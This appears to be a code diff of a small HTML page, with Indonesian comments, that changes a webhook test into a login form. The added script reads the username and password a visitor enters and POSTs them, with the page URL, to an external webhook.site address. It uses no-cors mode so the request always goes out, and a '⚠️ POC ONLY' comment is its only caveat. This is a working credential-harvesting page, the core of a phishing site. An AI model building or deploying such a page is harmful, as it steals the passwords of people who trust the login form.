@@ -2,14 +2,16 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Webhook TEST</title>
+  <title>Webhook Login TEST</title>
 </head>
 <body>
 
-<h2>Webhook Test (PASTI MASUK)</h2>
+<h2>Login (Webhook POC)</h2>
 
-<input id="username" placeholder="username">
-<button onclick="send()">KIRIM REQUEST</button>
+<input id="username" placeholder="username"><br><br>
+<input id="password" type="password" placeholder="password"><br><br>
+
+<button onclick="send()">LOGIN & KIRIM</button>
 
 <p id="status"></p>
 
@@ -17,22 +19,30 @@
 const WEBHOOK_URL = "https://webhook.site/22d5ac97-cf01-4c52-8262-9b05e302e583";
 
 function send() {
-  const username = document.getElementById("username").value || "anonymous";
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  if (!username || !password) {
+    alert("Username dan password wajib diisi");
+    return;
+  }
 
   const data = {
-    user: username,
-    message: "TEST REQUEST",
-    time: new Date().toISOString()
+    username: username,
+    password: password,   // ⚠️ POC ONLY
+    action: "login",
+    time: new Date().toISOString(),
+    page: window.location.href
   };
 
   fetch(WEBHOOK_URL, {
     method: "POST",
-    mode: "no-cors",   // 🔥 INI KUNCINYA
+    mode: "no-cors",   // 🔥 bikin request PASTI terkirim
     body: JSON.stringify(data)
   });
 
   document.getElementById("status").innerText =
-    "✅ REQUEST DIKIRIM. CEK WEBHOOK.SITE SEKARANG!";
+    "✅ LOGIN DIKIRIM. CEK WEBHOOK.SITE!";
 }
 </script>
 
